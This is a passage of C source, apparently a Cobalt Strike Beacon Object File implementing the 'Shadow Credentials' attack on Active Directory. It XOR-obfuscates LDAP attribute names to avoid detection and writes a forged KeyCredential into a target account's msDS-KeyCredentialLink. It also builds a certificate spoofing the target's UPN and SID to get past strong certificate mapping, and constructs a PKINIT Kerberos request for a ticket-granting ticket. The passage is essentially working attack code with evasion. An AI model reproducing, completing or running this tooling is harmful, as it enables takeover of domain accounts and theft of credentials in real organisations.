 static BYTE* sc_asn_gtime(const char* ts, int* outLen) {
     int l = (int)strlen(ts);
     *outLen = 2 + l;
     BYTE* r = (BYTE*)malloc(*outLen);
     r[0] = 0x18; r[1] = (BYTE)l;
     memcpy(r + 2, ts, l);
     return r;
 }
 
 static BYTE* sc_asn_int(int v, int* outLen) {
     BYTE* r;
     if (v >= 0 && v < 128)   { *outLen=3; r=(BYTE*)malloc(3); r[0]=0x02;r[1]=0x01;r[2]=(BYTE)v; return r; }
     if (v >= 0 && v < 256)   { *outLen=4; r=(BYTE*)malloc(4); r[0]=0x02;r[1]=0x02;r[2]=0x00;r[3]=(BYTE)v; return r; }
     *outLen=6; r=(BYTE*)malloc(6);
     r[0]=0x02;r[1]=0x04;
     r[2]=(BYTE)(v>>24);r[3]=(BYTE)(v>>16);r[4]=(BYTE)(v>>8);r[5]=(BYTE)v;
     return r;
 }
 
 static BYTE* sc_asn_int_raw(BYTE* data, int dLen, int* outLen) {
     BYTE lb[4];
     int pad = (data[0] & 0x80) ? 1 : 0;
     int total = dLen + pad;
     int ls = sc_der_len_enc(lb, total);
     *outLen = 1 + ls + total;
     BYTE* r = (BYTE*)malloc(*outLen);
     r[0] = 0x02;
     memcpy(r + 1, lb, ls);
     if (pad) { r[1 + ls] = 0x00; memcpy(r + 2 + ls, data, dLen); }
     else memcpy(r + 1 + ls, data, dLen);
     return r;
 }
 
 static BYTE* sc_asn_bits(BYTE* data, int dLen, int* outLen) {
     BYTE lb[4];
     int ls = sc_der_len_enc(lb, dLen + 1);
     *outLen = 1 + ls + 1 + dLen;
     BYTE* r = (BYTE*)malloc(*outLen);
     r[0] = 0x03;
     memcpy(r + 1, lb, ls);
     r[1 + ls] = 0x00;
     memcpy(r + 2 + ls, data, dLen);
     return r;
 }
 
 /* =============================================================================
  * Utility: SHA-1 and SHA-256
  * ============================================================================= */
 
 static BOOL sc_sha256(BYTE* data, int dLen, BYTE* out) {
     HCRYPTPROV hP; HCRYPTHASH hH;
     DWORD hLen = 32;
     BOOL ok = FALSE;
     if (CryptAcquireContextW(&hP, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         if (CryptCreateHash(hP, CALG_SHA_256, 0, 0, &hH)) {
             if (CryptHashData(hH, data, dLen, 0))
                 ok = CryptGetHashParam(hH, HP_HASHVAL, out, &hLen, 0);
             CryptDestroyHash(hH);
         }
         CryptReleaseContext(hP, 0);
     }
     return ok;
 }
 
 static void sc_sha1(BYTE* data, int dLen, BYTE* out) {
     HCRYPTPROV hP; HCRYPTHASH hH;
     DWORD hLen = 20;
     if (CryptAcquireContextW(&hP, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
         if (CryptCreateHash(hP, CALG_SHA1, 0, 0, &hH)) {
             CryptHashData(hH, data, dLen, 0);
             CryptGetHashParam(hH, HP_HASHVAL, out, &hLen, 0);
             CryptDestroyHash(hH);
         }
         CryptReleaseContext(hP, 0);
     }
 }
 
 /* =============================================================================
  * Phase 1 — LDAP attribute obfuscation
  *
  * Attribute names are XOR'd with 0x5A to avoid plain strings in .text.
  * Decoded at runtime into caller-supplied buffers.
  * ============================================================================= */
 
 #define SC_XOR 0x5A
 
 static void sc_deobf_w(WCHAR* s, int n) {
     int i;
     for (i = 0; i < n; i++) s[i] ^= SC_XOR;
 }
 
 /* Fills four WCHAR buffers with decoded LDAP attribute names */
 static void sc_ldap_attrs(WCHAR* sam, WCHAR* dn, WCHAR* sid, WCHAR* kcl) {
     /* "sAMAccountName" ^ 0x5A */
     WCHAR _sam[] = { 0x29,0x1B,0x17,0x1B,0x39,0x39,0x35,0x2F,0x34,0x2E,0x14,0x3B,0x37,0x3F,0x00 };
     /* "distinguishedName" ^ 0x5A */
     WCHAR _dn[]  = { 0x3E,0x33,0x29,0x2E,0x33,0x34,0x3D,0x2F,0x33,0x29,0x32,0x3F,0x3E,0x14,0x3B,0x37,0x3F,0x00 };
     /* "objectSid" ^ 0x5A */
     WCHAR _sid[] = { 0x35,0x38,0x30,0x3F,0x39,0x2E,0x09,0x33,0x3E,0x00 };
     /* "msDS-KeyCredentialLink" ^ 0x5A */
     WCHAR _kcl[] = { 0x37,0x29,0x1E,0x09,0x77,0x11,0x3F,0x23,0x19,0x28,0x3F,0x3E,0x3F,0x34,0x2E,0x33,0x3B,0x36,0x16,0x33,0x34,0x31,0x00 };
 
     wcscpy(sam, _sam); sc_deobf_w(sam, 14);
     wcscpy(dn,  _dn);  sc_deobf_w(dn,  17);
     wcscpy(sid, _sid); sc_deobf_w(sid,  9);
     wcscpy(kcl, _kcl); sc_deobf_w(kcl, 22);
 }
 
 /* =============================================================================
  * Phase 1 — LDAP: resolve target DN and objectSid
  * ============================================================================= */
 
 static BOOL sc_ldap_lookup(const char* target, const char* domain,
     WCHAR* outDN, int dnLen, BYTE** ppSid, DWORD* pSidLen)
 {
     LDAP* ld = NULL;
     LDAPMessage *res = NULL, *entry = NULL;
     struct berval** vals = NULL;
     WCHAR *wDomain=NULL, *wBase=NULL, *wFilter=NULL, *wTarget=NULL;
     WCHAR atSam[32], atDN[32], atSid[16], atKCL[32];
     WCHAR* attrs[3];
     ULONG rc;
     BOOL ok = FALSE;
     ULONG off = 0;
 
     sc_ldap_attrs(atSam, atDN, atSid, atKCL);
     attrs[0] = atDN; attrs[1] = atSid; attrs[2] = NULL;
 
     *ppSid = NULL; *pSidLen = 0; outDN[0] = L'\0';
 
     wDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
     wBase   = (WCHAR*)malloc(512 * sizeof(WCHAR));
     wFilter = (WCHAR*)malloc(512 * sizeof(WCHAR));
     wTarget = (WCHAR*)malloc(256 * sizeof(WCHAR));
 
     if (!wDomain || !wBase || !wFilter || !wTarget) goto end;
 
     memset(wDomain,0,256*sizeof(WCHAR));
     memset(wBase,0,512*sizeof(WCHAR));
     memset(wFilter,0,512*sizeof(WCHAR));
     memset(wTarget,0,256*sizeof(WCHAR));
 
     MultiByteToWideChar(CP_UTF8,0,domain,-1,wDomain,256);
     MultiByteToWideChar(CP_UTF8,0,target,-1,wTarget,256);
 
     /* Build DC=x,DC=y base from domain */
     {
         WCHAR *src=wDomain, *dst=wBase, *seg=src;
         while (*src) {
             if (*src == L'.') {
                 wcscpy(dst, L"DC="); dst += 3;
                 while (seg < src) *dst++ = *seg++;
                 *dst++ = L',';
                 seg = src + 1;
             }
             src++;
         }
         wcscpy(dst, L"DC="); dst += 3;
         while (*seg) *dst++ = *seg++;
         *dst = L'\0';
     }
 
     ld = ldap_initW(wDomain, LDAP_PORT);
     if (!ld) { BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_init failed"); goto end; }
 
     ldap_set_optionW(ld, LDAP_OPT_REFERRALS, &off);
     rc = ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
     if (rc != LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_bind failed: %u", rc);
         goto end;
     }
 
     SC_SWPRINTF(wFilter, L"(%s=%s)", atSam, wTarget);
     rc = ldap_search_sW(ld, wBase, LDAP_SCOPE_SUBTREE, wFilter, attrs, 0, &res);
     if (rc != LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_search failed: %u", rc);
         goto end;
     }
 
     entry = ldap_first_entry(ld, res);
     if (!entry) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Target not found in directory: %s", target);
         goto end;
     }
 
     PWSTR rawDN = ldap_get_dnW(ld, entry);
     if (rawDN) { wcscpy(outDN, rawDN); ldap_memfreeW(rawDN); }
 
     vals = ldap_get_values_lenW(ld, entry, atSid);
     if (vals && vals[0] && vals[0]->bv_len > 0 && IsValidSid((PSID)vals[0]->bv_val)) {
         DWORD sl = GetLengthSid((PSID)vals[0]->bv_val);
         *ppSid = (BYTE*)malloc(sl);
         if (*ppSid) { memcpy(*ppSid, vals[0]->bv_val, sl); *pSidLen = sl; }
         ldap_value_free_len(vals);
     }
 
     ok = TRUE;
 
 end:
     if (res) ldap_msgfree(res);
     if (ld)  ldap_unbind(ld);
     if (wDomain) free(wDomain);
     if (wBase)   free(wBase);
     if (wFilter) free(wFilter);
     if (wTarget) free(wTarget);
     return ok;
 }
 
 /* =============================================================================
  * Phase 1 — LDAP: write / delete msDS-KeyCredentialLink
  * ============================================================================= */
 
 static LDAP* sc_ldap_connect(const char* domain) {
     WCHAR wDomain[256];
     ULONG off = 0;
     MultiByteToWideChar(CP_UTF8,0,domain,-1,wDomain,256);
     LDAP* ld = ldap_initW(wDomain, LDAP_PORT);
     if (!ld) return NULL;
     ldap_set_optionW(ld, LDAP_OPT_REFERRALS, &off);
     if (ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
         ldap_unbind(ld);
         return NULL;
     }
     return ld;
 }
 
 static BOOL sc_ldap_write(const char* domain, WCHAR* targetDN, BYTE* blob, int blobLen) {
     WCHAR atSam[32], atDN[32], atSid[16], atKCL[32];
     sc_ldap_attrs(atSam, atDN, atSid, atKCL);
 
     LDAP* ld = sc_ldap_connect(domain);
     if (!ld) { BeaconPrintf(CALLBACK_OUTPUT, "[!] LDAP connect failed (write)"); return FALSE; }
 
     int hexLen = blobLen * 2;
     /* B:<hexLen>:<hexBlob>:<DN> */
     WCHAR* val = (WCHAR*)malloc((32 + hexLen + wcslen(targetDN) + 1) * sizeof(WCHAR));
     if (!val) { ldap_unbind(ld); return FALSE; }
 
     SC_SWPRINTF(val, L"B:%d:", hexLen);
     int pos = (int)wcslen(val);
     int i;
     for (i = 0; i < blobLen; i++) SC_SWPRINTF(val + pos + i*2, L"%02X", blob[i]);
     wcscat(val, L":");
     wcscat(val, targetDN);
 
     WCHAR* strVals[2] = { val, NULL };
     LDAPModW mod, *mods[2];
     mod.mod_op = LDAP_MOD_ADD;
     mod.mod_type = atKCL;
     mod.mod_vals.modv_strvals = strVals;
     mods[0] = &mod; mods[1] = NULL;
 
     BOOL ok = (ldap_modify_sW(ld, targetDN, mods) == LDAP_SUCCESS);
     if (ok) {
         int vl = (int)wcslen(val) + 1;
         g_keycred_val = (WCHAR*)malloc(vl * sizeof(WCHAR));
         if (g_keycred_val) wcscpy(g_keycred_val, val);
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_modify failed — GenericWrite/GenericAll required");
     }
 
     ldap_unbind(ld);
     free(val);
     return ok;
 }
 
 static BOOL sc_ldap_delete(const char* domain, WCHAR* targetDN) {
     if (!g_keycred_val) return FALSE;
 
     WCHAR atSam[32], atDN[32], atSid[16], atKCL[32];
     sc_ldap_attrs(atSam, atDN, atSid, atKCL);
 
     LDAP* ld = sc_ldap_connect(domain);
     if (!ld) return FALSE;
 
     WCHAR* strVals[2] = { g_keycred_val, NULL };
     LDAPModW mod, *mods[2];
     mod.mod_op = LDAP_MOD_DELETE;
     mod.mod_type = atKCL;
     mod.mod_vals.modv_strvals = strVals;
     mods[0] = &mod; mods[1] = NULL;
 
     BOOL ok = (ldap_modify_sW(ld, targetDN, mods) == LDAP_SUCCESS);
     ldap_unbind(ld);
     return ok;
 }
 
 /* =============================================================================
  * Phase 2 — KeyCredential blob construction (MS-ADTS 2.2.20)
  * ============================================================================= */
 
 static BYTE* sc_keycred_entry(BYTE id, BYTE* data, int dLen, int* outLen) {
     *outLen = 3 + dLen;
     BYTE* r = (BYTE*)malloc(*outLen);
     r[0] = (BYTE)(dLen & 0xFF);
     r[1] = (BYTE)((dLen >> 8) & 0xFF);
     r[2] = id;
     memcpy(r + 3, data, dLen);
     return r;
 }
 
 static BYTE* sc_keycred_build(BYTE* pubKey, int pubKeyLen, GUID* devId, int* outLen) {
     FILETIME ft;
     BYTE ftBytes[8];
     BYTE keyId[32], keyHash[32];
     BYTE usage[1]  = { KC_USAGE_NGC };
     BYTE source[1] = { KC_SOURCE_AD };
     BYTE customInfo[2] = { 0x01, 0x00 };
     int offset;
 
     GetSystemTimeAsFileTime(&ft);
     memcpy(ftBytes, &ft, 8);
 
     int kmLen,kuLen,ksLen,diLen,ckiLen,llLen,ctLen;
     BYTE* km  = sc_keycred_entry(KC_KEYMATERIAL, pubKey,    pubKeyLen, &kmLen);
     BYTE* ku  = sc_keycred_entry(KC_KEYUSAGE,    usage,     1,         &kuLen);
     BYTE* ks  = sc_keycred_entry(KC_KEYSOURCE,   source,    1,         &ksLen);
     BYTE* di  = sc_keycred_entry(KC_DEVICEID,    (BYTE*)devId, 16,     &diLen);
     BYTE* cki = sc_keycred_entry(KC_CUSTOMKEYINFO, customInfo, 2,      &ckiLen);
     BYTE* ll  = sc_keycred_entry(KC_LASTLOGON,   ftBytes,   8,         &llLen);
     BYTE* ct  = sc_keycred_entry(KC_CREATION,    ftBytes,   8,         &ctLen);
 
     int propLen = kmLen+kuLen+ksLen+diLen+ckiLen+llLen+ctLen;
     BYTE* props = (BYTE*)malloc(propLen);
     offset = 0;
     memcpy(props+offset,km,kmLen);   offset+=kmLen;
     memcpy(props+offset,ku,kuLen);   offset+=kuLen;
     memcpy(props+offset,ks,ksLen);   offset+=ksLen;
     memcpy(props+offset,di,diLen);   offset+=diLen;
     memcpy(props+offset,cki,ckiLen); offset+=ckiLen;
     memcpy(props+offset,ll,llLen);   offset+=llLen;
     memcpy(props+offset,ct,ctLen);   offset+=ctLen;
 
     sc_sha256(pubKey, pubKeyLen, keyId);
     sc_sha256(props, propLen, keyHash);
 
     int kiLen,khLen;
     BYTE* ki = sc_keycred_entry(KC_KEYID,   keyId,   32, &kiLen);
     BYTE* kh = sc_keycred_entry(KC_KEYHASH, keyHash, 32, &khLen);
 
     *outLen = 4 + kiLen + khLen + propLen;
     BYTE* blob = (BYTE*)malloc(*outLen);
     /* Version 0x0200 LE */
     blob[0]=0x00; blob[1]=0x02; blob[2]=0x00; blob[3]=0x00;
     offset = 4;
     memcpy(blob+offset,ki,kiLen); offset+=kiLen;
     memcpy(blob+offset,kh,khLen); offset+=khLen;
     memcpy(blob+offset,props,propLen);
 
     free(km); free(ku); free(ks); free(di); free(cki); free(ll); free(ct);
     free(ki); free(kh); free(props);
     return blob;
 }
 
 /* =============================================================================
  * Phase 3 — RSA key export in BCRYPT_RSAKEY_BLOB format
  * ============================================================================= */
 
 static BYTE* sc_rsa_export_bcrypt(HCRYPTKEY hKey, int* outLen) {
     DWORD blobLen = 0;
     if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, NULL, &blobLen)) return NULL;
 
     BYTE* blob = (BYTE*)malloc(blobLen);
     if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, blob, &blobLen)) { free(blob); return NULL; }
 
     DWORD bitLen    = *(DWORD*)(blob + 12);
     DWORD modLen    = bitLen / 8;
     BYTE* modulus   = blob + 20;
 
     /* BCRYPT_RSAKEY_BLOB: Magic+BitLen+cbExp+cbMod+cbP1+cbP2 = 24 bytes header */
     int expLen = 3; /* e = 65537 = 3 bytes */
     *outLen = 24 + expLen + modLen;
     BYTE* out = (BYTE*)malloc(*outLen);
 
     *(DWORD*)(out+ 0) = BCRYPT_RSA_MAGIC;
     *(DWORD*)(out+ 4) = bitLen;
     *(DWORD*)(out+ 8) = expLen;
     *(DWORD*)(out+12) = modLen;
     *(DWORD*)(out+16) = 0;
     *(DWORD*)(out+20) = 0;
     out[24] = 0x01; out[25] = 0x00; out[26] = 0x01;
 
     /* Modulus: CryptoAPI = little-endian, BCRYPT = big-endian */
     DWORD i;
     for (i = 0; i < modLen; i++) out[27 + i] = modulus[modLen - 1 - i];
 
     free(blob);
     return out;
 }
 
 /* =============================================================================
  * Phase 3 — Certificate generation
  * ============================================================================= */
 
 static BYTE* sc_cert_build(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* cn,
     const char* upn, const char* sidStr, WCHAR* container,
     int* certLen, int* pfxLen);
 
 static BYTE* sc_cert_generate(const char* cn, const char* domain, const char* sidStr,
     BYTE** ppPubKey, int* pPubKeyLen, BYTE** ppPfx, int* pPfxLen, GUID* devId)
 {
     HCRYPTPROV hProv = 0;
     HCRYPTKEY  hKey  = 0;
     WCHAR container[64];
     char  upn[256];
     int   certLen = 0;
 
     CoCreateGuid(devId);
     SC_SWPRINTF(container, L"ShadCred_%08X%04X", devId->Data1, devId->Data2);
 
     if (!CryptAcquireContextW(&hProv, container, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
         if (GetLastError() == NTE_EXISTS) {
             if (!CryptAcquireContextW(&hProv, container, MS_ENHANCED_PROV_W, PROV_RSA_FULL, 0)) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW: 0x%08X", GetLastError());
                 return NULL;
             }
         } else {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW: 0x%08X", GetLastError());
             return NULL;
         }
     }
 
     if (!CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptGenKey: 0x%08X", GetLastError());
         CryptReleaseContext(hProv, 0);
         return NULL;
     }
 
     *ppPubKey = sc_rsa_export_bcrypt(hKey, pPubKeyLen);
     if (!*ppPubKey) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] RSA public key export failed");
         CryptDestroyKey(hKey);
         CryptReleaseContext(hProv, 0);
         return NULL;
     }
 
     sprintf(upn, "%s@%s", cn, domain);
     *ppPfx = sc_cert_build(hProv, hKey, cn, upn, sidStr, container, &certLen, pPfxLen);
 
     CryptDestroyKey(hKey);
     return *ppPubKey;
 }
 
 static BYTE* sc_cert_build(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* cn,
     const char* upn, const char* sidStr, WCHAR* container,
     int* certLen, int* pfxLen)
 {
     BYTE *pbSubject=NULL, *pbUPN=NULL, *pbSAN=NULL, *pbCert=NULL;
     CERT_PUBLIC_KEY_INFO* pbPubInfo=NULL;
     DWORD cbSubject=0, cbUPN=0, cbSAN=0, cbPubInfo=0, cbCert=0;
     CERT_OTHER_NAME    otherName;
     CERT_ALT_NAME_ENTRY altEntries[2];
     CERT_ALT_NAME_INFO  altInfo;
     CERT_EXTENSION exts[1];
     DWORD numExts = 0, numAlt = 1;
     CERT_INFO certInfo;
     CRYPT_ALGORITHM_IDENTIFIER sigAlgo;
     SYSTEMTIME stNow, stExp;
     HCERTSTORE hStore = NULL;
     PCCERT_CONTEXT pCtx = NULL;
     CRYPT_KEY_PROV_INFO kpi;
     CRYPT_DATA_BLOB pfx;
     BYTE* result = NULL;
     static WCHAR wSidUrl[256];
     char subjectStr[256];
 
     memset(altEntries,0,sizeof(altEntries));
     memset(&altInfo,0,sizeof(altInfo));
     memset(&certInfo,0,sizeof(certInfo));
     memset(&kpi,0,sizeof(kpi));
     memset(&pfx,0,sizeof(pfx));
     memset(&sigAlgo,0,sizeof(sigAlgo));
 
     sprintf(subjectStr, "CN=%s", cn);
     if (!CertStrToNameA(X509_ASN_ENCODING, subjectStr, CERT_X500_NAME_STR, NULL, NULL, &cbSubject, NULL)) goto done;
     pbSubject = (BYTE*)malloc(cbSubject);
     if (!CertStrToNameA(X509_ASN_ENCODING, subjectStr, CERT_X500_NAME_STR, NULL, pbSubject, &cbSubject, NULL)) goto done;
 
     /* UPN as UTF8String for OtherName */
     {
         DWORD ul = (DWORD)strlen(upn);
         cbUPN = (ul < 128) ? (2 + ul) : (4 + ul);
         pbUPN = (BYTE*)malloc(cbUPN);
         BYTE* p = pbUPN;
         *p++ = 0x0C;
         if (ul < 128) *p++ = (BYTE)ul;
         else { *p++ = 0x82; *p++ = (BYTE)(ul>>8); *p++ = (BYTE)(ul&0xFF); }
         memcpy(p, upn, ul);
     }
 
     otherName.pszObjId   = (LPSTR)OID_NT_PRINCIPAL_NAME;
     otherName.Value.cbData = cbUPN;
     otherName.Value.pbData = pbUPN;
     altEntries[0].dwAltNameChoice = CERT_ALT_NAME_OTHER_NAME;
     altEntries[0].pOtherName      = &otherName;
 
     /* SID URL for KB5014754 strong mapping */
     if (sidStr && sidStr[0]) {
         char sidUrl[256];
         sprintf(sidUrl, "tag:microsoft.com,2022-09-14:sid:%s", sidStr);
         MultiByteToWideChar(CP_UTF8,0,sidUrl,-1,wSidUrl,256);
         altEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
         altEntries[1].pwszURL         = wSidUrl;
         numAlt = 2;
     }
 
     altInfo.cAltEntry  = numAlt;
     altInfo.rgAltEntry = altEntries;
 
     if (!CryptEncodeObjectEx(X509_ASN_ENCODING, szOID_SUBJECT_ALT_NAME2, &altInfo,
             CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbSAN, &cbSAN)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] SAN encode failed: 0x%08X", GetLastError());
         goto done;
     }
 
     exts[numExts].pszObjId    = (LPSTR)szOID_SUBJECT_ALT_NAME2;
     exts[numExts].fCritical   = FALSE;
     exts[numExts].Value.cbData = cbSAN;
     exts[numExts].Value.pbData = pbSAN;
     numExts++;
 
     CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, NULL, &cbPubInfo);
     pbPubInfo = (CERT_PUBLIC_KEY_INFO*)malloc(cbPubInfo);
     if (!CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, pbPubInfo, &cbPubInfo)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptExportPublicKeyInfo failed");
         goto done;
     }
 
     GetSystemTime(&stNow);
     stExp = stNow;
     stExp.wYear += 1;
 
     certInfo.dwVersion              = CERT_V3;
     certInfo.SerialNumber.cbData    = 16;
     certInfo.SerialNumber.pbData    = (BYTE*)malloc(16);
     CryptGenRandom(hProv, 16, certInfo.SerialNumber.pbData);
 
     sigAlgo.pszObjId = (LPSTR)szOID_RSA_SHA256RSA;
     certInfo.SignatureAlgorithm = sigAlgo;
     certInfo.Issuer.cbData      = cbSubject;
     certInfo.Issuer.pbData      = pbSubject;
     SystemTimeToFileTime(&stNow, &certInfo.NotBefore);
     SystemTimeToFileTime(&stExp, &certInfo.NotAfter);
     certInfo.Subject.cbData     = cbSubject;
     certInfo.Subject.pbData     = pbSubject;
     certInfo.SubjectPublicKeyInfo = *pbPubInfo;
     certInfo.cExtension         = numExts;
     certInfo.rgExtension        = exts;
 
     if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
             X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo, NULL, NULL, &cbCert)) goto done;
     pbCert = (BYTE*)malloc(cbCert);
     if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
             X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo, NULL, pbCert, &cbCert)) goto done;
     *certLen = cbCert;
 
     hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL);
     if (!hStore) goto done;
 
     pCtx = CertCreateCertificateContext(X509_ASN_ENCODING, pbCert, cbCert);
     if (!pCtx) goto done;
 
     {
         PCCERT_CONTEXT pStored = NULL;
         if (!CertAddCertificateContextToStore(hStore, pCtx, CERT_STORE_ADD_ALWAYS, &pStored)) goto done;
 
         kpi.pwszContainerName = container;
         kpi.pwszProvName      = MS_ENHANCED_PROV_W;
         kpi.dwProvType        = PROV_RSA_FULL;
         kpi.dwKeySpec         = AT_KEYEXCHANGE;
         CertSetCertificateContextProperty(pStored, CERT_KEY_PROV_INFO_PROP_ID, 0, &kpi);
         CertFreeCertificateContext(pStored);
     }
 
     pfx.pbData = NULL; pfx.cbData = 0;
     if (!PFXExportCertStoreEx(hStore, &pfx, L"", NULL, EXPORT_PRIVATE_KEYS)) goto done;
     pfx.pbData = (BYTE*)malloc(pfx.cbData);
     if (!PFXExportCertStoreEx(hStore, &pfx, L"", NULL, EXPORT_PRIVATE_KEYS)) goto done;
 
     *pfxLen = pfx.cbData;
     result  = pfx.pbData;
 
 done:
     if (certInfo.SerialNumber.pbData) free(certInfo.SerialNumber.pbData);
     if (pbSubject) free(pbSubject);
     if (pbUPN)     free(pbUPN);
     if (pbSAN)     LocalFree(pbSAN);
     if (pbPubInfo) free(pbPubInfo);
     if (pbCert && !result) free(pbCert);
     if (pCtx)    CertFreeCertificateContext(pCtx);
     if (hStore)  CertCloseStore(hStore, 0);
     return result;
 }
 
 /* =============================================================================
  * Phase 4 — DH key generation
  * ============================================================================= */
 
 static void sc_dh_generate(HCRYPTPROV hProv) {
     SC_BIGINT p, g, x, y;
     CryptGenRandom(hProv, sizeof(g_dh_priv), g_dh_priv);
     g_dh_priv[0] &= 0x7F;
     bi_from_bytes(&p, SC_DH_P, sizeof(SC_DH_P));
     bi_from_bytes(&g, SC_DH_G, sizeof(SC_DH_G));
     bi_from_bytes(&x, g_dh_priv, sizeof(g_dh_priv));
     bi_modpow(&y, &g, &x, &p);
     bi_to_bytes(&y, g_dh_pub, sizeof(g_dh_pub));
 }
 
 /* =============================================================================
  * Phase 4 — Kerberos AS-REQ construction (PKINIT)
  * ============================================================================= */
 
 static BYTE* sc_krb_principal(int nameType, const char* n1, const char* n2, int* outLen) {
     BYTE buf[1024], strs[512];
     int off=0, sl=0;
     int ntLen, ntTagLen, s1Len, seqLen, seqTagLen;
 
     BYTE* nt    = sc_asn_int(nameType, &ntLen);
     BYTE* ntTag = sc_asn_ctx(0, nt, ntLen, &ntTagLen);
     memcpy(buf+off, ntTag, ntTagLen); off+=ntTagLen;
     free(nt); free(ntTag);
 
     BYTE* s1 = sc_asn_genstr(n1, &s1Len);
     memcpy(strs+sl, s1, s1Len); sl+=s1Len; free(s1);
     if (n2) {
         int s2Len;
         BYTE* s2 = sc_asn_genstr(n2, &s2Len);
         memcpy(strs+sl, s2, s2Len); sl+=s2Len; free(s2);
     }
 
     BYTE* seq    = sc_asn_seq(strs, sl, &seqLen);
     BYTE* seqTag = sc_asn_ctx(1, seq, seqLen, &seqTagLen);
     memcpy(buf+off, seqTag, seqTagLen); off+=seqTagLen;
     free(seq); free(seqTag);
 
     BYTE* result = sc_asn_seq(buf, off, outLen);
     return result;
 }
 
 static BYTE* sc_krb_reqbody(const char* user, const char* realm, int* outLen) {
     BYTE buf[4096];
     int off = 0;
     SYSTEMTIME st;
     char till[24];
     BYTE etypes[64];
     int etLen = 0;
 
     /* kdc-options [0] BIT STRING — forwardable + renewable + renewable-ok */
     BYTE kdcOpts[] = { 0x03,0x05,0x00,0x40,0x81,0x00,0x10 };
     int koTagLen;
     BYTE* koTag = sc_asn_ctx(0, kdcOpts, sizeof(kdcOpts), &koTagLen);
     memcpy(buf+off, koTag, koTagLen); off+=koTagLen; free(koTag);
 
     /* cname [1] */
     int cnLen, cnTagLen;
     BYTE* cn    = sc_krb_principal(1, user, NULL, &cnLen);
     BYTE* cnTag = sc_asn_ctx(1, cn, cnLen, &cnTagLen);
     memcpy(buf+off, cnTag, cnTagLen); off+=cnTagLen; free(cn); free(cnTag);
 
     /* realm [2] */
     int rlLen, rlTagLen;
     BYTE* rl    = sc_asn_genstr(realm, &rlLen);
     BYTE* rlTag = sc_asn_ctx(2, rl, rlLen, &rlTagLen);
     memcpy(buf+off, rlTag, rlTagLen); off+=rlTagLen; free(rl); free(rlTag);
 
     /* sname [3] krbtgt/REALM */
     int snLen, snTagLen;
     BYTE* sn    = sc_krb_principal(2, "krbtgt", realm, &snLen);
     BYTE* snTag = sc_asn_ctx(3, sn, snLen, &snTagLen);
     memcpy(buf+off, snTag, snTagLen); off+=snTagLen; free(sn); free(snTag);
 
     /* till [5] */
     GetSystemTime(&st);
     sprintf(till, "%04d%02d%02d%02d%02d%02dZ",
         st.wYear+1, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
     int tlLen, tlTagLen;
     BYTE* tl    = sc_asn_gtime(till, &tlLen);
     BYTE* tlTag = sc_asn_ctx(5, tl, tlLen, &tlTagLen);
     memcpy(buf+off, tlTag, tlTagLen); off+=tlTagLen; free(tl); free(tlTag);
 
     /* nonce [7] */
     srand((unsigned int)time(NULL));
     g_nonce = 100000000 + (rand() % 899999999);
     int ncLen, ncTagLen;
     BYTE* nc    = sc_asn_int(g_nonce, &ncLen);
     BYTE* ncTag = sc_asn_ctx(7, nc, ncLen, &ncTagLen);
     memcpy(buf+off, ncTag, ncTagLen); off+=ncTagLen; free(nc); free(ncTag);
 
     /* etype [8] AES256 + AES128 + RC4 */
     int eLen;
     BYTE* e1 = sc_asn_int(ETYPE_AES256, &eLen); memcpy(etypes+etLen, e1, eLen); etLen+=eLen; free(e1);
     BYTE* e2 = sc_asn_int(ETYPE_AES128, &eLen); memcpy(etypes+etLen, e2, eLen); etLen+=eLen; free(e2);
     BYTE* e3 = sc_asn_int(ETYPE_RC4,    &eLen); memcpy(etypes+etLen, e3, eLen); etLen+=eLen; free(e3);
     int etSeqLen, etTagLen;
     BYTE* etSeq = sc_asn_seq(etypes, etLen, &etSeqLen);
     BYTE* etTag = sc_asn_ctx(8, etSeq, etSeqLen, &etTagLen);
     memcpy(buf+off, etTag, etTagLen); off+=etTagLen; free(etSeq); free(etTag);
 
     return sc_asn_seq(buf, off, outLen);
 }
 
 static BYTE* sc_pkinit_authenticator(BYTE* cksum, int cksumLen, int* outLen) {
     BYTE buf[1024];
     int off = 0;
     SYSTEMTIME st;
     char ts[24];
 
     GetSystemTime(&st);
 
     /* cusec [0] */
     int csLen, csTagLen;
     BYTE* cs    = sc_asn_int(st.wMilliseconds * 1000, &csLen);
     BYTE* csTag = sc_asn_ctx(0, cs, csLen, &csTagLen);
